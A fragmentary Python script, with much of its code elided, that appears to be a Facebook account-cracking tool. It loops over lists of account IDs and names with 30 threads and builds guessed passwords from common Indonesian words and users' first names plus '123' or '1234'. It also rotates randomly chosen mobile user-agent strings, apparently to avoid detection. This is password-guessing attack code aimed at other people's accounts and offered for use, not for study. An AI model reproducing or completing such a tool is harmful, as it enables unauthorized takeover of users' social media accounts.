...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/571109557964638/posts/pfbid07LqmAJJctsL8fieFE9MwCFMAYvbkXjJRBDKnuPxd4WWwdmseGGZXGKVnCb6G9DAbl/?app=fbl')
...
def otomatis():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['sayang','rahasia','bismillah']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=3:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
...
def crack(idf,pwx,url,awal):
	...
	ua = random.choice(['Mozilla/5.0 (Linux; Android 9; Samsung Galaxy Note 9 Build/SM-N960N) AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/71.0. 3578.99 Mobile Safari/604.1.','Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36 OPR/68.3.3557.64528','Mozilla/5.0 (Linux; Android 9; SPC SMART LITE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Lenovo TB-X605L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/58.2.2878.53403','Mozilla/5.0 (Linux; Android 11; RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; 7.0; Redmi Note 9 Pro)L438S) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4558.72 Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid','Mozilla/5.0 (Linux; Android 7.0; 11; Redmi Note 4 Build/NRD90M)C897D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4342.112 Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F900U Build/PPR1.180610.011B459K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.8797.0.4545.108 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; 9; Redmi Note 9 ProP321P) Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4570.72 Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG GT-I9506/XXUDOE4 Build/LRX22CE518D) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87102.0.4218.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-F900U Build/PPR1.180610.011D259O) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.8790.0.4417.58 Mobile Safari/537.36'])
